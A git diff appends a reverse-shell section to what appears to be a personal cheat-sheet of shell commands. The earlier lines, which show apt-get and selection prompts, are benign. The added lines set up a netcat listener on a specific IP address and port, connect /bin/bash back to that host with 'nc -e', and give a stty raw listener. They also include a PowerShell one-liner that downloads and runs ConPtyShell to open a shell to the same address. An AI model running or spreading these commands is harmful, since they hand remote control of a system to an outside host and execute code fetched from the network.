@@ -350,3 +350,20 @@ echo "$a was selected."
 
 # How to run command without selection
 DEBIAN_FRONTEND="noninteractive" apt-get install --yes python-opencv
+
+
+# reverse shells with netcat
+```
+nc -lnvp 87 -s 69.164.204.158
+# listen, nodns, verbose, port ( listener
+
+nc -e /bin/bash 69.164.204.158 87
+
+
+
+ssty raw -echo; (stty size;cat) | nc -lnvp 87 -s 69.164.204.158
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 69.164.204.158 87
+
+```
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python
